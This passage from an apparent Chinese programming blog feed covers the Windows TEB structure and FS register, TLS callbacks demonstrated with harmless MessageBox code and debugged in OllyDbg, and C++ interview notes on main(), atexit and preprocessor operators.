class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStack : _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1bc</span> SpareBytes1      : [<span class="number">24</span>] UChar</span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] Uint4B</span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] Uint4B</span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : Uint4B</span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] Uint2B</span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : Ptr32 Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf28</span> HardErrorsAreDisabled : Uint4B</span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">16</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> InDbgPrint       : UChar</span><br><span class="line">   +<span class="number">0xf75</span> FreeStackOnTermination : UChar</span><br><span class="line">   +<span class="number">0xf76</span> HasFiberData     : UChar</span><br><span class="line">   +<span class="number">0xf77</span> IdealProcessor   : UChar</span><br><span class="line">   +<span class="number">0xf78</span> Spare3           : Uint4B</span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : Uint4B</span><br><span class="line">   +<span class="number">0xf88</span> Wx86Thread       : _Wx86ThreadState</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0xf98</span> ImpersonationLocale : Uint4B</span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : Uint4B</span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : Uint4B</span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0xfb4</span> SafeThunkCall    : UChar</span><br><span class="line">   +<span class="number">0xfb5</span> BooleanSpare     : [<span class="number">3</span>] UChar</span><br></pre></td></tr></table></figure><h2 id="重要成员"><a href="#重要成员" class="headerlink" title="重要成员"></a>重要成员</h2><p>可以看到TEB结构体很庞大，成员有很多，但是在Ring3层面的调试中我们需要重点关注的成员有2个：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">+<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">+<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br></pre></td></tr></table></figure><h3 id="NtTib"><a href="#NtTib" class="headerlink" title="NtTib"></a>NtTib</h3><p>TEB结构体的<strong>第一个成员</strong>就是TIB（Thread Information Block，线程信息块），_NT_TIB结构体定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>          //<span class="title">sizeof</span>  1<span class="title">ch</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="number">00</span>h   <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span>  *<span class="title">ExceptionList</span>;</span>          <span class="comment">//SEH链入口</span></span><br><span class="line"> <span class="number">04</span>h   PVOID                            StackBase;              <span class="comment">//堆栈基址</span></span><br><span class="line"> <span class="number">08</span>h   PVOID                            StackLimit;             <span class="comment">//堆栈大小</span></span><br><span class="line"> <span class="number">0</span>ch   PVOID                            SubSystemTib;</span><br><span class="line">       <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">           PVOID                FiberData;</span><br><span class="line"> <span class="number">10</span>h       DWORD                Version;</span><br><span class="line">       &#125;;</span><br><span class="line"> <span class="number">14</span>h   PVOID                            ArbitraryUserPointer;</span><br><span class="line"> <span class="number">18</span>h   <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span>                   *<span class="title">Self</span>;</span>                  <span class="comment">//本NT_TIB结构自身的线性地址</span></span><br><span class="line">&#125;NT_TIB;</span><br></pre></td></tr></table></figure><p>成员<code>ExceptionList</code>指向<code>_EXCEPTION_REGISTRATION_RECORD</code>结构体组成的链表，用于SEH（Structed Exception Handling，结构化异常处理）；</p><p>成员<code>Self</code>既是自引用指针，又是TEB结构体的指针（因为TEB结构体第一个成员就是TIB）。</p><h3 id="ProcessEnvironmentBlock"><a href="#ProcessEnvironmentBlock" class="headerlink" title="ProcessEnvironmentBlock"></a>ProcessEnvironmentBlock</h3><p>Offset30处的ProcessEnvironmentBlock成员是指向PEB（Process Environment Block，进程环境块）的指针，每个进程对应一个PEB结构体。</p><h2 id="访问TEB"><a href="#访问TEB" class="headerlink" title="访问TEB"></a>访问TEB</h2><p>Ring3层面可以通过OS提供的相关API访问TEB。</p><h3 id="Ntdll-NtCurrentTeb"><a href="#Ntdll-NtCurrentTeb" class="headerlink" title="Ntdll.NtCurrentTeb()"></a>Ntdll.NtCurrentTeb()</h3><p>Ntdll.NtCurrentTeb()可以返回当前线程TEB结构体的地址。</p><p>在WIndows XP SP3环境下使用OllyDbg查看notepad.exe程序：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210315210122.png" alt="TEBNtCurrentTeb001"></p><p>双击该API跳转到代码领空如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210315210133.png" alt="TEBNtCurrentTeb002"></p><p>从上图我们可以看到，NtCurrentTeb()API只返回FS:[18]当中的值，FS:[18]的地址为7FFDF018，该地址当中存的值就是当前线程的TEB地址。从内存窗口进入7FFDF018地址，可以看到当中的值为7FFDF000，发现这和FS段寄存器所指的段内存的基址一样。可以看出来TEB和FS段寄存器之间有着某种关联。</p><h3 id="FS段寄存器"><a href="#FS段寄存器" class="headerlink" title="FS段寄存器"></a>FS段寄存器</h3><p>FS段寄存器所指定的内存段有着很多和进程、线程相关的信息。也就是说，FS可以用来指示当前线程的TEB结构体。</p><p>FS寄存器指示SDT（段描述符表SDT，一种是全局段描述符表(GDT),另一种是局部段描述符表(LDT), 对应的寄存器分别为GDTR和LDTR）的索引index，其中存放着TEB结构体的偏移地址。 SDT位于内核内存区域，基地址存放在GDTR（全局描述符表寄存器）中。 因此GDTR+FS就可以得到TEB结构体的指针了[也就是FS是选择偏移，GDTR提供基址。最后GDTR+FS得到的地址就是TEB结构体的指针位置。就像系统段描述符和进程的LDT表获取的方法一样].</p><h4 id="SDT"><a href="#SDT" class="headerlink" title="SDT"></a>SDT</h4><p>FS段就是用来指示当前线程的TEB结构体。</p><p>IA-32当中进程的虚拟地址大小为4GB，所以需要32位的指针才可以访问整个内存空间，但是FS段寄存器的大小只有16位。所以说实际上FS段寄存器并非直接指向TEB结构体的地址，而是它持有SDT的索引，该索引持有实际的TEB地址。</p><blockquote><p>SDT位于内核区域，其地址在GDTR（Global Descriptor Table Resiger，全局描述符表寄存器）中。</p></blockquote><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210315210056.png" alt="SDT001"></p><p>FS段寄存器存储的是SDT的索引，所以它也被称为“段选择符”（Segment Selector）。从上图可以看到TEB结构体位于FS段选择符所指的段内存的起始地址处。</p><ul><li>FS:[0x18] = TEB起始地址，对应有下面的等价关系：</li></ul><blockquote><p>FS:[0x18] = TEB.NtTib.Self = address of TIB = address of TEB = FS:0</p></blockquote><p>从_NT_TIB结构体定义可知，Self成员恰好位于偏移0x18处，Self指向_NT_TIB结构体的起始地址，也就是TEB的起始地址。</p><ul><li>FS:[0x30] = PEB起始地址，对应有下面的等价关系：</li></ul><blockquote><p>FS:[0x30] = TEB.ProcessEnvironmentBlock = address of PEB</p></blockquote><ul><li>FS:[0]</li></ul><blockquote><p>FS:[0] = TEB.NtTib.ExceptionList = address of SEH</p></blockquote><p>补充：</p><p>偏移 说明</p><p>000 指向SEH链指针</p><p>004 线程堆栈顶部</p><p>008 线程堆栈底部</p><p>00C SubSystemTib</p><p>010 FiberData</p><p>014 ArbitraryUserPointer</p><p>018 FS段寄存器在内存中的镜像地址</p><p>020 进程PID</p><p>024 线程ID</p><p>02C 指向线程局部存储指针</p><p>030 PEB结构地址（进程结构）</p><p>034 上个错误号</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;What-is-TEB&quot;&gt;&lt;a href=&quot;#What-is-TEB&quot; class=&quot;headerlink&quot; title=&quot;What is TEB&quot;&gt;&lt;/a&gt;What is TEB&lt;/h1&gt;&lt;p&gt;TEB（Thread Environment Block，线程环境块</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Anti-debug" scheme="http://0xnope.top/tags/Anti-debug/"/>
    
  </entry>
  
  <entry>
    <title>TLS回调函数</title>
    <link href="http://0xnope.top/2021/03/13/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <id>http://0xnope.top/2021/03/13/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</id>
    <published>2021-03-13T14:00:19.000Z</published>
    <updated>2021-03-13T14:52:55.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>TLS （Thread Local Storage 线程本地存储 ）回调函数（Callback Function）。</p><p>TLS是各线程的独立的数据存储空间，对象的存储在线程开始时分配，线程结束时回收，每个线程有该对象自己的实例。使用TLS技术可在<strong>线程</strong>内部独立使用或修改<strong>进程</strong>的<strong>全局数据</strong>或<strong>静态数据</strong>。</p><p>TLS 回调函数的调用运行要先于 EP 代码的执行。该特性使它可以作为一种反调试技术使用，许多病毒或壳会利用这一点执行一些特殊的操作。</p><p>创建或者终止某线程时，TLS回调函数会自动执行（前后共两次）。</p><h2 id="IMAGE-TLS-Directory"><a href="#IMAGE-TLS-Directory" class="headerlink" title="IMAGE_TLS_Directory"></a>IMAGE_TLS_Directory</h2><p>若在编程中启用了 TLS，PE 头文件中会设置 TLS 项目<strong>（IMAGE_NT_HEARDERS-&gt;IMAGE_OPTIONAL_HEADER-&gt;IMAGE_DATA_DIRECTORY[9]）</strong>。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210313220748.png" alt="TLS001"></p><p>IMAGE_TLS_DIRECTORY结构体有32位和64位，当中比较重要的成员是Address of Callbacks，该值指向TLS回调函数的地址数组（程序启动之前，系统会调用数组当中的函数，数组以NULL结束），这说明一个程序可以有多个TLS回调函数。</p><h1 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h1><h2 id="IMAGE-TLS-CALLBACK"><a href="#IMAGE-TLS-CALLBACK" class="headerlink" title="IMAGE_TLS_CALLBACK"></a>IMAGE_TLS_CALLBACK</h2><p>定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> VOID</span><br><span class="line">(NTAPI *PIMAGE_TLS_CALLBACK)(</span><br><span class="line"> PVOID DllHandle, <span class="comment">//DllHandle模块句柄</span></span><br><span class="line"> DWORD Reason, <span class="comment">//Reason调用原因</span></span><br><span class="line"> PVOID Reserved<span class="comment">// Reserved加载方式（显式/隐式）</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure><p>其定义和Dllmain类似：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hinstDLL, </span></span></span><br><span class="line"><span class="function"><span class="params">DWORD fdwReason, </span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpvReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>其中Reason表示调用TLS回调函数的原因，有以下几种参数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_DETACH 0 进程退出</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_PROCESS_ATTACH 1 进程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_ATTACH 2  线程启动</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_THREAD_DETACH 3  线程退出</span></span><br></pre></td></tr></table></figure><h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//告知链接器使用TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (linker, <span class="meta-string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (linker, <span class="meta-string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI __stdcall <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_ATTACH&quot;</span>, <span class="string">L&quot;TLS测试&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_ATTACH&quot;</span>, <span class="string">L&quot;TLS测试&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_THREAD_DETACH&quot;</span>, <span class="string">L&quot;TLS测试&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;DLL_PROCESS_DETACH&quot;</span>, <span class="string">L&quot;TLS测试&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 注册TLS函数</span></span><br><span class="line"><span class="comment">* .CRT$XLX的作用</span></span><br><span class="line"><span class="comment">* CRT表示使用C Runtime 机制</span></span><br><span class="line"><span class="comment">* X表示表示名随机</span></span><br><span class="line"><span class="comment">* L表示TLS Callback section</span></span><br><span class="line"><span class="comment">* X也可以换成B~Y任意一个字符</span></span><br><span class="line"><span class="comment">* 不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg (<span class="meta-string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback = TLS_CALLBACK;<span class="comment">//共享数据段</span></span><br><span class="line"><span class="comment">// 如果想要定义多个TLS回调函数，可以将PIMAGE_TLS_CALLBACK _tls_callback = tls_callback;</span></span><br><span class="line"><span class="comment">// 更改为：</span></span><br><span class="line"><span class="comment">// PIMAGE_TLS_CALLBACK _tls_callback[] = &#123; tls_callback_1, tls_callback_2, tls_callback_3,0 &#125;;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MessageBox(<span class="number">0</span>, <span class="string">L&quot;这是main函数&quot;</span>, <span class="string">L&quot;main函数&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210313222112.png" alt="TLS测试代码结果001"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210313222122.png" alt="TLS测试代码结果002"></p><p>通过弹窗我们可以清晰的判断程序执行前首先执行了TLS回调函数。</p><h1 id="调试TLS回调函数"><a href="#调试TLS回调函数" class="headerlink" title="调试TLS回调函数"></a>调试TLS回调函数</h1><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210313223632.png" alt="调试TLS回调函数od选项001"></p><p>修改od选项即可调试TLS回调函数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TLS&quot;&gt;&lt;a href=&quot;#TLS&quot; class=&quot;headerlink&quot; title=&quot;TLS&quot;&gt;&lt;/a&gt;TLS&lt;/h1&gt;&lt;p&gt;TLS （Thread Local Storage 线程本地存储 ）回调函数（Callback Function）。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Anti-debug" scheme="http://0xnope.top/tags/Anti-debug/"/>
    
  </entry>
  
  <entry>
    <title>C++笔记</title>
    <link href="http://0xnope.top/2021/03/09/C++%E7%AC%94%E8%AE%B0/"/>
    <id>http://0xnope.top/2021/03/09/C++%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-09T08:21:23.000Z</published>
    <updated>2021-03-22T09:19:13.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>许多书上说<code>main()</code>函数是一个程序的入口，但是这种说法并不准确，因为在<code>main()</code>函数之前操作系统已经做了一些初始化工作，比如TLS函数也是先于<code>main()</code>函数执行，而且在<code>main()</code>函数执行完之后也有一些扫尾工作。</p><p>根据C99的标准，<code>main()</code>函数有两种形式，有参和无参：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br></pre></td></tr></table></figure><p>有些人习惯将<code>main()</code>函数的返回值写出void，其实<code>main()</code>函数的返回值为int。既然<code>main()</code>函数有返回值，那么肯定有一个地方接收<code>main()</code>函数的返回值，这也说明<code>main()</code>函数并非程序的入口点。</p><p><code>main()</code>函数的第一个参数是argc，argument count的缩写，表示输入参数个数。第二个参数是argv， argument value的缩写，字符串指针数组类型，其中argv[0]表示程序名字，其余元素表示通过命令行输入的参数。</p><h2 id="经典面试题"><a href="#经典面试题" class="headerlink" title="经典面试题"></a>经典面试题</h2><h3 id="main函数执行前后都发生了什么"><a href="#main函数执行前后都发生了什么" class="headerlink" title="main函数执行前后都发生了什么"></a>main函数执行前后都发生了什么</h3><p>来看看下面这段代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Test()&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Test()&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor&quot;</span> &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Test t;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">atexit(func1);</span><br><span class="line">atexit(func2);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is main func&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>Constructor<br>This is main func<br>func2<br>func1<br>Destructor</p></blockquote><p>在<code>main()</code>函数中的显示代码执行之前，会由编译器生成_main函数，其中会进行所有全局对象的构造以及初始化工作。简单来说对静态变量、全局变量和全局对象来说的分配是早在<code>main()</code>函数之前就完成的，所以<code>C/C++</code>中并非所有的动作都是由于<code>main()</code>函数引起的。 </p><p><code>atexit()</code>函数的参数是指向函数的指针，通过函数名作为参数，可以使函数在<code>atexit()</code>函数内部完成注册，因为函数注册中用到了栈，所以调用顺序和注册顺序相反。经过注册的函数会在<code>main()</code>函数最后一条语句执行后调用。</p><p>在最后会对全局变量和全局对象进行销毁操作，所以在<code>main()</code>函数还会执行相应的代码。 </p><p>答案：</p><p><code>main()</code>函数执行之前调用全局对象和静态对象的构造函数，初始化全局变量和静态变量；<code>main()</code>函数执行完之后会调用在<code>atexit()</code>中注册的函数（调用顺序相反），最后对全局变量和全局对象进行销毁操作。</p><h1 id="预处理和执行"><a href="#预处理和执行" class="headerlink" title="预处理和执行"></a>预处理和执行</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>源程序经过<strong>预处理、编译、汇编、链接</strong>等多个步骤后，才可以生成可以在机器上直接运行的可执行程序，完整的处理流程如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210309175433.png" alt="源程序处理流程"></p><p>预处理的主要处理规则如下：</p><ul><li>将所有的“#define”删除，展开所有的宏定义。</li><li>处理所有的条件预编译指令如“#if”、“#ifdef”、“#elif”、“#else”、“#endif”。</li><li>处理“#include”预编译指令。</li><li>添加行号或者标识，以便编译时编译器产生调试用的行号信息以及用于编译报错时能够显示行号。</li><li>保留所有的#pragma编译器指令，因为编译器必须要使用它们。</li></ul><p>实际上预处理器除了处理#开头的代码以外还做了其他的事：</p><ul><li><p>处理预定义的宏：比如<code>__DATE__</code>、<code>__FILE__</code>。</p></li><li><p>删除所有注释：用空格处理连续的注释。</p></li><li><p>处理三元符：比如将??=替换成#，??/替换成\。（注：老键盘不提供‘#’或者’^’符号，维护古老代码可能会遇到三元符）。</p></li></ul><p>编译过程一般可以分为6步：<strong>扫描（Scanner）、语法分析（Parser）、语义分析（Semantic Analyzer）、源代码优化（Source Code Optimizer）、代码生成（Code Generator）、目标代码优化（Code Optimizer）</strong>来将源代码转换为汇编代码。</p><p>汇编器将编译器生成的汇编代码转换为计算机可以识别的机器码，并生成目标文件。</p><p>链接器将所有会用到的目标文件像拼拼图一样链接到一起，最终生成可执行程序。</p><h2 id="经典面试题-1"><a href="#经典面试题-1" class="headerlink" title="经典面试题"></a>经典面试题</h2><h3 id="简述-include-lt-gt-和-include””的区别"><a href="#简述-include-lt-gt-和-include””的区别" class="headerlink" title="简述#include&lt;&gt;和#include””的区别"></a>简述#include&lt;&gt;和#include””的区别</h3><p>答案：</p><p>#include&lt;&gt;直接从编译器指定的路径处搜索。</p><p>#include””首先在程序当前目录搜索，然后再在编译器指定路径搜索。</p><h3 id="简述-与-在define中的作用"><a href="#简述-与-在define中的作用" class="headerlink" title="简述#与##在define中的作用"></a>简述#与##在define中的作用</h3><p>代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>LINK(x, y)x##y</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTCUBE(x)cout &lt;&lt; <span class="meta-string">&quot;cube(&quot;</span>&lt;&lt;#x&lt;&lt;<span class="meta-string">&quot;) =&quot;</span> &lt;&lt; (x) * (x) * (x) &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> y = <span class="number">5</span>;</span><br><span class="line">PRINTCUBE(<span class="number">5</span>);</span><br><span class="line">PRINTCUBE(y);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> xy = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; LINK(x, y) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><blockquote><p>cube(5) =125<br>cube(y) =125<br>10</p></blockquote><p>分析：</p><p>程序定义了个带参数的宏PRINTCUBE用于输出一个数的三次方，宏定义当中的#可以把#后面的宏参数进行完整的字符串化。</p><p>第一句<code>PRINTCUBE(5)</code>输出cube(5) =125，#x替换成了“5”，“5”是字符串常量，所以这一过程被称为字符串化。</p><p>第二句<code>PRINTCUBE(y)</code>输出cube(y) =125，#x替换成了”y”，而“y”同样是字符串常量，不会被替换成y的值5。</p><p>宏定义中的##运算符可以把##前后宏参数进行字符串连接而不依赖参数的具体类型。</p><p>第三句<code>LINK(x, y)</code>将会使编译器把 <code>cout &lt; &lt; LINK(x, y)&lt; &lt; endl;</code> 解释为  <code>cout &lt; &lt; xy &lt; &lt; endl;</code> 